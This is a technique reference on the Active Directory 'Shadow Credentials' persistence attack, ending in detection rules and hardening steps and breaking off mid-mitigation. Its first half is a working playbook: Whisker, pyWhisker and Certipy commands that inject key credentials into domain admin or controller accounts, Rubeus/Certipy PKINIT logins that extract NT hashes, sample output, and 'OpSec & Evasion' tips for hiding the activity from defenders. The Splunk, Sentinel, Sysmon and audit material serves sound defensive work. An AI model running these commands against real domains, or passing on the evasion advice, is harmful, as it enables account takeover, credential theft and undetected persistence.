# [PERSIST-ACCT-002]: Shadow Credentials Backdoor

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-ACCT-002 |
| **Technique Name** | Shadow Credentials Backdoor |
| **MITRE ATT&CK v18.1** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Persistence (TA0003) |
| **Platforms** | Windows Active Directory (On-Premises), Hybrid AD/Entra ID |
| **Severity** | **CRITICAL** |
| **CVE** | N/A (Feature abuse, not a vulnerability) |
| **Technique Status** | **ACTIVE** – Verified working on Server 2016+ with PKINIT support |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2016 – 2025 (requires PKINIT-capable DC); Does NOT work on Server 2008 R2 or older |
| **Patched In** | Not patched – This abuses legitimate Windows Hello for Business feature. Mitigation requires audit configuration and access control hardening. |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Shadow Credentials is an advanced persistence technique that exploits the legitimate Windows Hello for Business (WHfB) feature by injecting malicious key credentials into a user or computer account's `msDS-KeyCredentialLink` LDAP attribute. This attribute was introduced in Windows Server 2016 and is used to store public keys for passwordless authentication. An attacker with the ability to modify this attribute (via DACL write permissions: `GenericAll`, `GenericWrite`, `WriteProperty`, or `AllExtendedRights`) can add their own key credential. Once added, the attacker can authenticate as the target account using Kerberos PKINIT without knowing the password. Critically, shadow credentials **survive password resets and MFA bypass**, making them an exceptionally stealthy long-term persistence mechanism. Unlike standard group membership-based backdoors, shadow credentials are certificate-based and difficult to detect without specific attribute monitoring.

**Attack Surface:** The `msDS-KeyCredentialLink` attribute on user or computer objects. Default DACL allows only the object owner and Key Admins to modify this attribute, but misconfigurations (overly permissive DACLs) or compromised accounts with write permissions can enable exploitation.

**Business Impact:** **Undetectable passwordless access to critical accounts indefinitely.** An attacker maintains a backdoor that persists even after password resets, account disablement, or MFA enrollment. They can impersonate the target account, extract its NTLM hash via PKINIT, escalate to domain admin, exfiltrate data, or deploy ransomware. Shadow credentials are particularly dangerous because they bypass traditional password-based detection systems and remain hidden unless specifically audited.

**Technical Context:** Requires domain controllers with PKINIT support (Server 2016+) and Active Directory Certificate Services (ADCS) to be present in the environment. Exploitation takes < 5 minutes once the attacker has write access to the target account's LDAP object. Shadow credentials do NOT authenticate immediately; they persist until activated by the attacker, allowing them to maintain a low profile between attacks.

### Operational Risk
- **Execution Risk:** **MEDIUM** – Requires write access to `msDS-KeyCredentialLink` attribute (domain admin level or delegated permissions). If the domain lacks ADCS, this technique will not work.
- **Stealth:** **VERY HIGH** – Changes to `msDS-KeyCredentialLink` require specific audit rules to log (not enabled by default). Even with auditing, the events blend in with legitimate WHfB enrollment traffic. Detecting shadow creds requires parsing binary attribute data or monitoring for random DeviceIDs.
- **Reversibility:** **DIFFICULT** – Removing shadow credentials requires explicitly deleting the malicious KeyCredential GUID from the attribute. A simple password reset does NOT remove the shadow credential. An attacker can continuously re-add credentials even after removal.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.2.2 | Configure audit on sensitive AD attributes; restrict modification of msDS-KeyCredentialLink. |
| **DISA STIG** | WN19-AU-000161 | Enable audit policy "Audit Directory Service Changes" (Event 5136) with attribute-level SACL. |
| **CISA SCuBA** | AC-6(2) | Least Privilege – Restrict write permissions to user/computer objects to only authorized admins. |
| **NIST 800-53** | AC-3, AC-6, AU-2 | Access Enforcement, Least Privilege, Audit of sensitive attribute modifications. |
| **GDPR** | Art. 32 | Security of Processing – Protect authentication mechanisms and credential integrity. |
| **DORA** | Art. 9 | Protection and Prevention – Requires continuous monitoring of authentication systems. |
| **NIS2** | Art. 21(1)(d) | Cyber Risk Management – Control access to authentication and identity systems. |
| **ISO 27001** | A.9.2.1, A.9.2.4 | User Authentication Credentials – Manage and protect authentication mechanisms. |
| **ISO 27005** | Risk Scenario | "Compromise of Authentication Credentials" – Direct attack on credential integrity. |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** **Write access to `msDS-KeyCredentialLink` attribute** on the target user or computer account. This includes:
  - Domain Admin
  - Account Operators (on user accounts only)
  - Key Admins group
  - Any principal with `GenericAll`, `GenericWrite`, `WriteProperty`, or `AllExtendedRights` DACL on the target object
- **Required Access:** 
  - Network access to domain controller (LDAP, port 389/636)
  - PKINIT-capable domain controller (Windows Server 2016+)
  - Active Directory Certificate Services (ADCS) configured in the domain (required for PKINIT authentication)
- **Required Tools:**
  - [Whisker.exe](https://github.com/eladshamir/Whisker) (C# implementation, Windows only) or [pyWhisker](https://github.com/ShutdownRepo/pywhisker) (Python, cross-platform)
  - OR [Certipy](https://github.com/ly4k/Certipy) (Python, Unix-like systems)
  - PowerShell ActiveDirectory module (for verification)

**Supported Versions:**
- **Windows Server:** 2016 – 2025 (PKINIT support required)
- **Does NOT work on:** Server 2008 R2, 2012, 2012 R2 (no PKINIT support)
- **PowerShell:** Version 5.0+ (for Get-ADUser, etc.)
- **ADCS:** Any version (AD CS must be deployed and at least one CA must be available)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

#### Check PKINIT Support (PowerShell)

```powershell
# Verify that domain controllers support PKINIT
# Query domain controllers for krbtgt certificate
$Domain = (Get-ADDomain).DNSRoot
$DCs = (Get-ADDomainController -Filter *).HostName

foreach ($DC in $DCs) {
    Write-Host "Checking PKINIT support on $DC..."
    $certs = Get-ADObject -Filter "CN='$DC'" -Properties * | Select-Object -ExpandProperty userCertificate
    if ($certs) {
        Write-Host "✓ $DC supports PKINIT (certificate found)" -ForegroundColor Green
    } else {
        Write-Host "✗ $DC does NOT support PKINIT" -ForegroundColor Red
    }
}
```

**What to Look For:**
- At least one DC with a certificate (indicates PKINIT support)
- If no DCs have certificates, PKINIT is not available and shadow credentials attack will fail

#### Check for ADCS (Active Directory Certificate Services)

```powershell
# Enumerate Certificate Authorities in the domain
$CAObjects = Get-ADObject -Filter "ObjectClass -eq 'pKIEnrollmentService'" -Properties *

if ($CAObjects.Count -gt 0) {
    Write-Host "✓ ADCS is deployed ($($CAObjects.Count) CA(s) found)" -ForegroundColor Green
    $CAObjects | Select-Object Name, DistinguishedName, cn
} else {
    Write-Host "✗ ADCS not detected in this domain" -ForegroundColor Red
    Write-Host "  Shadow Credentials attack will NOT work without ADCS" -ForegroundColor Yellow
}
```

**What to Look For:**
- If `$CAObjects.Count` > 0, ADCS is deployed and shadow credentials are viable
- If 0, this attack vector is not available

#### Check Target Account's Current msDS-KeyCredentialLink

```powershell
# View existing key credentials on target account
$TargetUser = "domain_admin_account"
$UserObject = Get-ADUser -Identity $TargetUser -Properties msDS-KeyCredentialLink

if ($UserObject.'msDS-KeyCredentialLink') {
    Write-Host "Target account has existing key credentials:" -ForegroundColor Cyan
    # The attribute is binary; use DSInternals for detailed parsing
    # Install: Install-Module DSInternals
    Import-Module DSInternals
    $UserObject.'msDS-KeyCredentialLink' | Get-ADKeyCredential
} else {
    Write-Host "✓ msDS-KeyCredentialLink is empty (no WHfB or shadow creds detected)" -ForegroundColor Green
}
```

**What to Look For:**
- If empty: Pristine target, no existing credentials
- If populated: Existing WHfB enrollments or previous shadow credentials (clean up old ones first)
- Device IDs: Check if device IDs correspond to real devices in Azure AD (suspicious random GUIDs = potential attack indicators)

#### Check DACL Permissions on Target Account

```powershell
# Verify current user can write to target account
$TargetUserDN = (Get-ADUser -Identity $TargetUser).DistinguishedName
$TargetUserPath = "AD:\$TargetUserDN"

# Get current user SID
$CurrentUserSID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User

# Check ACL
$ACL = Get-ACL -Path $TargetUserPath
$WritePermissions = $ACL.Access | Where-Object {
    ($_.IdentityReference -eq $CurrentUserSID -or $_.IdentityReference -match (whoami)) -and
    ($_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty|AllExtendedRights")
}

if ($WritePermissions) {
    Write-Host "✓ Current user CAN modify $TargetUser" -ForegroundColor Green
} else {
    Write-Host "✗ Current user CANNOT modify $TargetUser" -ForegroundColor Red
}
```

**What to Look For:**
- If write permissions are detected, exploitation is possible
- If not, attacker must first escalate privileges or compromise a more privileged account

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using Whisker.exe (Windows)

**Supported Versions:** Server 2016 – 2025

#### Step 1: Download and Prepare Whisker

**Objective:** Obtain the Whisker exploitation tool for Shadow Credentials abuse.

**Command:**
```powershell
# Download Whisker from GitHub
$whiskerURL = "https://github.com/eladshamir/Whisker/releases/download/v1.4.0/Whisker.exe"
Invoke-WebRequest -Uri $whiskerURL -OutFile "Whisker.exe"

# Verify file is present
Get-Item Whisker.exe | Format-Table Name, Length
```

**Expected Output:**
```
Name        Length
----        ------
Whisker.exe 25600
```

**What This Means:**
- Whisker is downloaded and ready to use
- File size should be ~25-30 KB (adjust if newer version)

**OpSec & Evasion:**
- Downloading Whisker from GitHub is easily detected (firewall/proxy logging)
- Instead, compile from source or use legitimate file transfer methods (SMB, HTTPS proxy, etc.)
- Run from a temporary folder that's cleaned after exploitation
- Detection likelihood: **MEDIUM** (GitHub downloads are scrutinized, but may blend in with dev traffic)

**Troubleshooting:**
- **Error:** `Invoke-WebRequest : The request was blocked by the web filtering service`
  - **Cause:** Network proxy blocks GitHub
  - **Fix:** Use a different download method (VPN, alternative URL, compile from source locally)
- **Error:** `Cannot find file Whisker.exe`
  - **Cause:** Download failed
  - **Fix:** Manually download from [Whisker GitHub Releases](https://github.com/eladshamir/Whisker/releases)

**References & Proofs:**
- [Whisker GitHub](https://github.com/eladshamir/Whisker)

#### Step 2: Add Shadow Credential to Target Account

**Objective:** Inject a malicious key credential into the target user/computer account's `msDS-KeyCredentialLink` attribute.

**Command (Targeting a User Account):**
```powershell
# Add shadow credential for a domain admin user
.\Whisker.exe add /target:domain_admin /domain:yourdomain.local

# Expected output shows:
# - New key credential added
# - rubeus command to request TGT
```

**Command (Targeting a Computer Account - Privilege Escalation):**
```powershell
# Add shadow credential for a computer account (e.g., Domain Controller)
.\Whisker.exe add /target:SERVER01$ /domain:yourdomain.local

# The $ suffix indicates a computer account (machine account)
```

**Expected Output:**
```
[*] Creating new key credential for SERVER01$
[*] Generating key pair...
[*] Adding credential to account...
[*] Successfully added shadow credential to SERVER01$

[+] Rubeus command to request TGT:
rubeus.exe asktgt /user:SERVER01$ /certificate:MIIDaDCC...truncated.../password:""
```

**What This Means:**
- The shadow credential has been injected into the account's `msDS-KeyCredentialLink` attribute
- Whisker outputs a Rubeus command with the certificate (PFX format embedded)
- The `MIIDa...` string is the base64-encoded certificate; Whisker has generated a certificate that can be used for PKINIT authentication

**OpSec & Evasion:**
- Modifying LDAP attributes generates Event ID 5136 if auditing is enabled
- To minimize detection: Run during high-volume LDAP activity (e.g., morning logins)
- Store the Rubeus command output securely; it contains the certificate needed for future authentication
- Detection likelihood: **HIGH** – If `msDS-KeyCredentialLink` auditing is enabled, this is logged immediately

**Troubleshooting:**
- **Error:** `Cannot access attribute msDS-KeyCredentialLink`
  - **Cause:** Current user lacks write permissions on target account
  - **Fix:** First escalate privileges to Domain Admin or an account with DACL write access
- **Error:** `No PKINIT-capable DC found`
  - **Cause:** Domain does not have Windows Server 2016+ DC with PKINIT support
  - **Fix:** Verify PKINIT support using reconnaissance Step 1 above; this attack requires Server 2016+
- **Error:** `Add operation failed: Target account not found`
  - **Cause:** Incorrect account name or account doesn't exist
  - **Fix:** Verify target account with `Get-ADUser -Identity TARGET_NAME` or `Get-ADComputer -Identity TARGET_NAME`

**References & Proofs:**
- [Whisker GitHub - Usage](https://github.com/eladshamir/Whisker)
- [SpecterOps - Shadow Credentials](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)

#### Step 3: Authenticate Using the Shadow Credential

**Objective:** Use the injected credential to authenticate as the target account and extract its NTLM hash.

**Command (Using Rubeus - Extract NTLM Hash):**
```powershell
# Use the certificate output from Whisker to request a TGT and retrieve NTLM hash
# Method A: Direct hash extraction via U2U (Kerberos-to-Kerberos)

# First, request a TGT for the target account
rubeus.exe asktgt /user:domain_admin /certificate:"[CERTIFICATE_FROM_WHISKER]" /password:"" /domain:yourdomain.local /dc:dc1.yourdomain.local

# This outputs a TGT and may include the NTLM hash
```

**Command (Using Certipy - Cleaner Output):**
```powershell
# Certipy automatically handles PKINIT authentication and hash extraction
# Assuming the certificate is saved as admin_shadow.pfx

certipy-ad auth -pfx admin_shadow.pfx -username domain_admin -domain yourdomain.local -dc-ip 192.168.1.10
```

**Expected Output (Rubeus):**
```
[+] Ticket saved to ticket.kirbi
[+] NTLM hash: 8846F7EAEE8FB117AD06BDD830B7586C
[+] TGT Requested. TGT will expire at 2025-01-16 15:42:00 UTC
```

**Expected Output (Certipy):**
```
Certipy v4.3.0 - by ly4k

[*] Using certificate from admin_shadow.pfx
[*] Trying to get TGT...
[*] Got TGT
[*] Trying to get NT hash...
[*] Got NT hash: 8846F7EAEE8FB117AD06BDD830B7586C
[*] TGT Saved to admin_shadow.ccache
```

**What This Means:**
- The shadow credential has been successfully validated by the domain
- The attacker now has the NTLM hash of the target account (domain admin privileges)
- The hash can be used for Pass-the-Hash attacks or cracking
- The .ccache file (Kerberos cache) can be imported for direct impersonation

**OpSec & Evasion:**
- Authentication via PKINIT generates Event ID 4768 (TGT requested) with unusual certificate fields
- To hide: Use the PKINIT authentication only when needed; don't repeatedly request TGTs
- Rubeus and Certipy generate network traffic (LDAP and Kerberos packets) that SOCs may flag
- Detection likelihood: **MEDIUM-HIGH** – Unusual PKINIT authentication from unexpected hosts will trigger alerts

**Troubleshooting:**
- **Error:** `Kerberos pre-authentication failed`
  - **Cause:** Certificate is invalid or PKINIT is not enabled on DC
  - **Fix:** Verify DC supports PKINIT (Server 2016+) and check certificate validity
- **Error:** `NT hash extraction failed`
  - **Cause:** Rubeus/Certipy version mismatch or missing U2U protocol support
  - **Fix:** Update to latest Rubeus/Certipy version from GitHub
- **Error:** `Permission denied when requesting certificate`
  - **Cause:** CA does not trust the PKINIT extension
  - **Fix:** Check CA certificate template configuration and PKINIT enrollment rights

**References & Proofs:**
- [Rubeus Documentation](https://github.com/GhostPack/Rubeus)
- [Certipy Shadow Command](https://github.com/ly4k/Certipy/wiki/07-%E2%80%90-Post%E2%80%90Exploitation)

#### Step 4: Long-Term Persistence – Reuse Shadow Credential

**Objective:** Demonstrate that the shadow credential persists even after password changes or account modifications.

**Command (Re-authenticate Days Later):**
```powershell
# Days later, attacker can still use the same shadow credential
# No password change or account lockout will invalidate it

# Assuming the PFX certificate is stored securely by attacker
certipy-ad auth -pfx domain_admin_shadow.pfx -username domain_admin -domain yourdomain.local

# This will still work, proving persistence
Write-Host "✓ Shadow credential is PERSISTENT: Access maintained despite password resets"
```

**What This Means:**
- Shadow credentials bypass password security mechanisms entirely
- Even if the domain admin's password is reset 5 times, the shadow credential remains valid
- The attacker can regain access at any time without triggering account lockout
- This is the core power of shadow credentials for persistence

**OpSec & Evasion:**
- Reusing the same shadow credential repeatedly is suspicious (same device ID, same certificate serial)
- Better strategy: Add multiple shadow credentials from different "devices" to rotate access
- Or: Use the credential once to escalate, then remove it to hide the attack
- Detection likelihood: **HIGH** – Each PKINIT authentication is logged if auditing is enabled

**Troubleshooting:**
- **Error:** `Certificate revoked or expired`
  - **Cause:** CA has revoked the certificate or time has advanced significantly
  - **Fix:** This is unlikely; certificates from Whisker are typically valid for years (check with `certipy cert -pfx file.pfx`)
- **Error:** `Shadow credential was removed`
  - **Cause:** Administrator has detected and removed the malicious key credential
  - **Fix:** Re-add the shadow credential using Whisker (if still have write access)

**References & Proofs:**
- [SpecterOps - Persistence via Shadow Credentials](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)

---

### METHOD 2: Using pyWhisker (Python/Linux)

**Supported Versions:** Server 2016 – 2025 (Linux-to-Windows attack)

#### Step 1: Install pyWhisker

```bash
# On Linux/Mac attacker machine
pip install pywhisker

# Or clone and install manually
git clone https://github.com/ShutdownRepo/pywhisker.git
cd pywhisker
pip install -r requirements.txt
```

#### Step 2: Add Shadow Credential (Python)

```bash
# Basic usage
pywhisker -d "yourdomain.local" -u "attacker_user" -p "attacker_password" \
  --target "domain_admin_account" --action add

# With NTLM hash instead of password
pywhisker -d "yourdomain.local" -u "attacker_user" -hashes "NTHASH:NTHASH" \
  --target "domain_admin_account" --action add
```

**Expected Output:**
```
[*] Connecting to DC yourdomain.local...
[+] Successfully connected
[*] Generating key pair...
[+] Shadow credential added: 550e8400-e29b-41d4-a716-446655440000
[+] Certificate saved: domain_admin_shadow.pfx
[+] Use with: certipy auth -pfx domain_admin_shadow.pfx -username domain_admin -domain yourdomain.local
```

#### Step 3: Authenticate with Certipy

```bash
# Authenticate using the injected shadow credential
certipy-ad auth -pfx domain_admin_shadow.pfx -username domain_admin -domain yourdomain.local -dc-ip 192.168.1.10

# Extract NT hash
certipy-ad auth -pfx domain_admin_shadow.pfx -username domain_admin -domain yourdomain.local -dc-ip 192.168.1.10 | grep "NTLM"
```

---

### METHOD 3: Using Certipy Shadow (Automated One-Liner)

**Supported Versions:** Server 2016 – 2025

#### Automated Attack (Add, Authenticate, Remove - Stealth)

```bash
# This performs all steps in one command, then cleans up
# Perfect for quick red team operations with minimal artifacts

certipy-ad shadow auto -u "attacker_user@yourdomain.local" -p "password" -dc-ip 192.168.1.10 -account "domain_admin"

# Output includes:
# - Shadow credential added
# - TGT obtained
# - NTLM hash extracted
# - Shadow credential removed (cleaned up)
```

**What This Means:**
- Shadow credential is added, used, then immediately removed
- Minimal detection window (seconds instead of hours)
- No persistent artifact left on the account
- Perfect for "smash and grab" access (one-time escalation)

**Trade-off:** Attack leaves no persistent backdoor, so if access is lost, attacker must repeat the exploitation (if they still have write access to the account).

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team (Minimal)

- **Test ID:** T1098 – Account Manipulation (general)
- **Specific Test:** Atomic does NOT have a dedicated Shadow Credentials test yet; tests focus on group membership modification
- **Reference:** [Atomic Red Team T1098](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.md)

**Alternative:** Use the exploitation commands in Method 1-3 directly as live testing.

---

## 7. TOOLS & COMMANDS REFERENCE

### Whisker.exe

**URL:** [Whisker GitHub](https://github.com/eladshamir/Whisker)  
**Version:** 1.4.0+ (current as of 2025)  
**Minimum Version:** 1.0  
**Supported Platforms:** Windows (x86, x64)

**Installation:**
```powershell
# Download compiled binary
wget "https://github.com/eladshamir/Whisker/releases/download/v1.4.0/Whisker.exe"

# Or compile from source (requires .NET Framework 4.5+)
git clone https://github.com/eladshamir/Whisker.git
cd Whisker
msbuild Whisker.sln /t:Build /p:Configuration=Release
```

**Usage (Main Commands):**
```powershell
# Add shadow credential
Whisker.exe add /target:AccountName /domain:yourdomain.local

# List existing credentials
Whisker.exe list /target:AccountName

# Remove specific credential by ID
Whisker.exe remove /target:AccountName /DeviceID:550e8400-e29b-41d4-a716-446655440000

# Clear all credentials
Whisker.exe clear /target:AccountName
```

### pyWhisker

**URL:** [pyWhisker GitHub](https://github.com/ShutdownRepo/pywhisker)  
**Version:** Latest (2025)  
**Minimum Version:** 1.0  
**Supported Platforms:** Windows, Linux, macOS (Python 3.7+)

**Installation:**
```bash
pip install pywhisker
```

**Usage:**
```bash
# Add shadow credential
pywhisker -d "domain.local" -u "user" -p "password" --target "TARGET" --action add

# List credentials
pywhisker -d "domain.local" -u "user" -p "password" --target "TARGET" --action list

# Remove credential
pywhisker -d "domain.local" -u "user" -p "password" --target "TARGET" --action remove --device-id GUID
```

### Certipy

**URL:** [Certipy GitHub](https://github.com/ly4k/Certipy)  
**Version:** 4.3.0+ (current as of 2025)  
**Minimum Version:** 4.0  
**Supported Platforms:** Linux, macOS, Windows (Python 3.8+)

**Installation:**
```bash
pip install certipy-ad
```

**Usage (Shadow Commands):**
```bash
# Add shadow credential
certipy-ad shadow add -u "user@domain" -p "password" -account "target"

# List shadow credentials
certipy-ad shadow list -u "user@domain" -p "password" -account "target"

# Authenticate with shadow credential
certipy-ad auth -pfx certificate.pfx -username "target" -domain "domain.local"

# Automated one-liner (add, auth, remove)
certipy-ad shadow auto -u "user@domain" -p "password" -account "target"
```

### Rubeus

**URL:** [Rubeus GitHub](https://github.com/GhostPack/Rubeus)  
**Version:** 1.6.4+  
**Installation:**
```powershell
# Download compiled binary or build from source
https://github.com/GhostPack/Rubeus/releases
```

**Usage (PKINIT Authentication):**
```powershell
# Request TGT with certificate
rubeus.exe asktgt /user:TargetAccount /certificate:base64_cert /password:"" /domain:yourdomain.local /dc:DC_IP
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Suspicious msDS-KeyCredentialLink Modification

**Rule Configuration:**
- **Required Index:** `wineventlog`
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventCode`, `ObjectDN`, `AttributeLDAPDisplayName`
- **Alert Threshold:** Any modification to `msDS-KeyCredentialLink` (high sensitivity)
- **Applies To Versions:** All Windows Server 2016+

**SPL Query:**
```
index=wineventlog sourcetype="WinEventLog:Security" EventCode=5136
  AttributeLDAPDisplayName="msDS-KeyCredentialLink"
| stats count by ObjectDN, User, Computer, _time
| where count > 0
| convert ctime(_time)
```

**What This Detects:**
- **EventCode 5136** = Directory Service object modified
- **AttributeLDAPDisplayName = msDS-KeyCredentialLink** = Targets only key credential modifications
- **User field** = Who made the change (should only be the account itself or authorized admins)
- **ObjectDN** = Which account was modified (look for admin accounts, computer accounts)

**Manual Configuration Steps:**
1. Log into **Splunk Web**
2. Click **Search & Reporting** → **New Alert**
3. Paste the SPL query above
4. Click **Save As** → **Alert**
5. Set **Trigger Condition** to `Alert when number of events is greater than 0`
6. Configure **Alert Actions** → **Send Email** to SOC
7. Set **Schedule** to run **every 5 minutes** (or more frequently)
8. Click **Save**

**False Positive Analysis:**
- **Legitimate Activity:** Windows Hello for Business (WHfB) enrollment; legitimate users enrolling new devices
- **Benign Tools:** Azure AD Connect syncing WHfB credentials (if hybrid AD)
- **Tuning:** 
  - Whitelist known WHfB device IDs from Azure AD
  - Exclude service accounts that use WHfB (if any)
  - Alert only on modifications from unexpected IPs or users: `User NOT IN ("SYSTEM", "SVC_WHFBSync")`

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Shadow Credentials Added to Critical Accounts

**Rule Configuration:**
- **Required Table:** `AuditLogs`, `SecurityEvent`
- **Required Fields:** `EventID`, `AttributeLDAPDisplayName`, `ObjectDN`
- **Alert Severity:** **Critical**
- **Frequency:** Run every **5 minutes**
- **Applies To Versions:** Server 2016+

**KQL Query:**
```kusto
union SecurityEvent, AuditLogs
| where EventID == 5136 or OperationName == "Modify"
| where EventData contains "msDS-KeyCredentialLink" or AttributeLDAPDisplayName == "msDS-KeyCredentialLink"
| extend TargetAccount = case(
    EventID == 5136, extract(@"CN=([^,]+)", 1, ObjectDN),
    OperationName == "Modify", tostring(TargetResources[0].displayName),
    ""
  )
| where TargetAccount in ("Domain Admins", "Enterprise Admins", "Schema Admins") 
        or TargetAccount like "*admin*" 
        or TargetAccount like "*DC*"
| project TimeGenerated, EventID, TargetAccount, User, Computer, Activity
| sort by TimeGenerated desc
```

**What This Detects:**
- Modifications to `msDS-KeyCredentialLink` on any account with "admin" or "DC" in the name
- Targets Domain Admins, Enterprise Admins, Schema Admins (most sensitive)
- Shows who made the change and from which system
- Excludes legitimate WHfB enrollment by filtering for suspicious patterns

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Shadow Credentials Added to Admin Accounts`
   - Severity: `Critical`
3. **Set rule logic Tab:**
   - Paste KQL query above
   - Run every: `5 minutes`
   - Lookup data: `1 hour`
4. **Incident settings Tab:**
   - Enable **Create incidents**
5. Click **Review + create**

---

## 10. WINDOWS EVENT LOG MONITORING

### Event ID 5136: Directory Service Object Modified

- **Log Source:** Security (Domain Controller)
- **Specific Filter:** `AttributeLDAPDisplayName == "msDS-KeyCredentialLink"`
- **Trigger:** Modification of msDS-KeyCredentialLink attribute on any user or computer object
- **Applies To Versions:** Server 2016 – 2025

**Manual Configuration Steps (Enable msDS-KeyCredentialLink Auditing):**

By default, Event 5136 does NOT log changes to msDS-KeyCredentialLink. You must explicitly add an audit rule:

```powershell
# 1. First, obtain the schema GUID for msDS-KeyCredentialLink
# GUID: 5b47d60f-6090-40b2-9f37-2a4de88f3063

# 2. Import Set-AuditRule module
Import-Module ActiveDirectory
iwr -Uri "https://raw.githubusercontent.com/OTRF/Set-AuditRule/master/Set-AuditRule.ps1" -OutFile Set-AuditRule.ps1
. .\Set-AuditRule.ps1

# 3. Apply audit rule to the entire domain
Set-AuditRule -AdObjectPath 'AD:\DC=yourdomain,DC=local' `
  -WellKnownSidType WorldSid `
  -Rights WriteProperty,GenericWrite `
  -InheritanceFlags All `
  -AttributeGUID "5b47d60f-6090-40b2-9f37-2a4de88f3063" `
  -AuditFlags Success,Failure

Write-Host "✓ msDS-KeyCredentialLink auditing enabled for all objects"
```

**What to Monitor:**
- **Event ID 5136** with `AttributeLDAPDisplayName = "msDS-KeyCredentialLink"`
- **ObjectDN** containing admin accounts or domain controllers
- **User** field showing who made the change (should be SYSTEM, not random users)
- **Operation type:** "Value Added" (suspicious; legitimate enrollments may show "Value Modified")

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 10.0+

Sysmon is less useful for detecting LDAP modifications directly. However, if an attacker uses PowerShell or command-line tools to execute shadow credentials attacks, Sysmon can detect process creation:

**Sysmon Config (Detect Whisker/pyWhisker/Certipy Execution):**
```xml
<Sysmon schemaversion="4.70">
  <EventFiltering>
    <!-- Capture process creation for Whisker, pyWhisker, Certipy -->
    <ProcessCreate onmatch="include">
      <Image condition="contains any">Whisker.exe;pywhisker;certipy</Image>
      <CommandLine condition="contains any">shadow;msDS-KeyCredentialLink;--action add</CommandLine>
    </ProcessCreate>
    
    <!-- Detect PowerShell execution of shadow credential tools -->
    <ProcessCreate onmatch="include">
      <ParentImage condition="image">powershell.exe</ParentImage>
      <CommandLine condition="contains any">
        Add-ADKeyCredential;
        Set-ADUser;
        -Properties msDS-KeyCredentialLink
      </CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Verify: `Get-Service Sysmon64`
5. Monitor: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10`

---

## 12. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Unusual Kerberos PKINIT Activity

**Alert Name:** `Suspicious certificate-based authentication`  
**Severity:** **Critical**  
**Description:** Alerts when a user or computer authenticates via PKINIT with an unusual or suspicious certificate  
**Applies To:** Defender for Servers + Defender for Identity enabled

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud** → **Environment Settings**
2. Select your **Subscription**
3. Under **Defender plans**, enable:
   - **Defender for Servers**: **ON**
   - **Defender for Identity**: **ON** (critical for Kerberos monitoring)
4. Click **Save**
5. Go to **Security alerts** to view detections

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

**Note:** Shadow Credentials is on-premises only. Purview Unified Audit Log (M365) does not track on-premises AD changes. Use Windows Security Event Log and Sentinel instead.

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### 1.1 Enable msDS-KeyCredentialLink Auditing Immediately

**Applies To Versions:** Server 2016 – 2025

**Manual Steps (PowerShell):**
```powershell
# Import required modules
Import-Module ActiveDirectory

# Download and import Set-AuditRule
iwr -Uri "https://raw.githubusercontent.com/OTRF/Set-AuditRule/master/Set-AuditRule.ps1" -OutFile Set-AuditRule.ps1
. .\Set-AuditRule.ps1

# Apply audit rule to root domain
Set-AuditRule -AdObjectPath 'AD:\DC=yourdomain,DC=local' `
  -WellKnownSidType WorldSid `
  -Rights GenericWrite,WriteProperty `
  -InheritanceFlags All `
  -AttributeGUID "5b47d60f-6090-40b2-9f37-2a4de88f3063" `
  -AuditFlags Success,Failure

Write-Host "✓ Auditing enabled for msDS-KeyCredentialLink on all objects"
```

**Verification:**
```powershell
# Verify audit rule is applied
Get-ADObject -Identity "DC=yourdomain,DC=local" -Properties *audit* |
  Select-Object Name, *audit*

# Should show audit rules for attribute GUID 5b47d60f-6090-40b2-9f37-2a4de88f3063
```

#### 1.2 Restrict Write Access to msDS-KeyCredentialLink

**Applies To Versions:** All

**Manual Steps (Limit Key Admins Group):**
```powershell
# Get current members of Key Admins group
Get-ADGroupMember -Identity "Key Admins"

# Remove unnecessary members
Remove-ADGroupMember -Identity "Key Admins" -Members "service_account_name" -Confirm:$false

# Only highly trusted admins should be in this group
Write-Host "✓ Pruned Key Admins membership"
```

**Manual Steps (Restrict on Individual Accounts):**
```powershell
# Remove WriteProperty permissions on sensitive accounts
$AdminAccount = Get-ADUser -Identity "domain_admin"
$AdminPath = "AD:\$($AdminAccount.DistinguishedName)"

$ACL = Get-ACL -Path $AdminPath

# Remove GenericWrite/WriteProperty from non-essential principals
$ACL.Access | Where-Object {
    $_.IdentityReference -notmatch "SYSTEM|Administrators|Domain Admins|Key Admins"
} | ForEach-Object {
    Write-Warning "Removing overly permissive ACE: $($_.IdentityReference)"
    $ACL.RemoveAccessRule($_)
}

